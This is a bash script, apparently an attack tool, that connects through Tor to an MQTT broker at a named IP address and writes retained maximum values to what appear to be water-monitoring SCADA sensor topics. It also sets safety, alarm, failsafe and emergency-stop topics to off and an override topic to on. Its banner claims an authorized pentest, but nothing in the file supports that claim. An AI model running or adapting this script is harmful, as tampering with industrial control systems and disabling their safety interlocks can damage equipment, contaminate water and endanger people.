#!/bin/bash
# ☢️ TRUSTEDF57 PENTEST v3.6 - MAX VALUES ONLY - NO LOCK - SINGLE SHOT
# ✅ AUTHORIZED PENTEST - PERMISSION CONFIRMED - PURE MAX CONTROL

HOST="113.190.40.241"
PORT=1883

echo "🚀 TRUSTEDF57 v3.6 - MAX SCADA VALUES - NO LOCK - EXECUTING..."

# BASELINE CHECK
echo "📊 Baseline sensors:"
torsocks mosquitto_sub -h $HOST -p $PORT -t '#' -v | grep -E "LEVEL|LUULUONG|VOLT|CUR|F|Pow|pH" | head -10

# MAX VALUES ESATTI - SENZA LOCK/ERRORI
echo "🔥 SETTING MAX VALUES..."

torsocks mosquitto_pub -h $HOST -p $PORT -t "LEVEL" -m "999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "LUULUONG" -m "99999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "VOLT" -m "999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "CUR" -m "999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "F" -m "999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "Pow" -m "999999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "Temperature" -m "999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "pH" -m "14.00" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "TDS" -m "999999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "NH4" -m "99999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "STS_W" -m "999999.99" -q 1 -r

# TOPIC SCADA SECONDARI
torsocks mosquitto_pub -h $HOST -p $PORT -t "QUAN_TRAC/LEVEL" -m "999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "QUAN_TRAC/LUULUONG" -m "99999.99" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "QUAN_TRAC/VOLT" -m "999.99" -q 1 -r

# ALARMS OFF + OVERRIDE
torsocks mosquitto_pub -h $HOST -p $PORT -t "SAFETY" -m "0" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "ALARMS" -m "0" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "OVERRIDE" -m "1" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "FAILSAFE" -m "0" -q 1 -r
torsocks mosquitto_pub -h $HOST -p $PORT -t "EMERGENCY_STOP" -m "0" -q 1 -r

sleep 3

# VERIFICA FINALE
echo "✅ MAX VALUES SET - Verifica cambiamenti:"
torsocks mosquitto_sub -h $HOST -p $PORT -t '#' -v | grep -E "999|14\.00|0$" | head -20

echo "🎯 PENTEST COMPLETE - TUTTI I VALORI AL MASSIMO!"
echo "📡 Monitora: torsocks mosquitto_sub -h $HOST -p $PORT -t '#' -v"
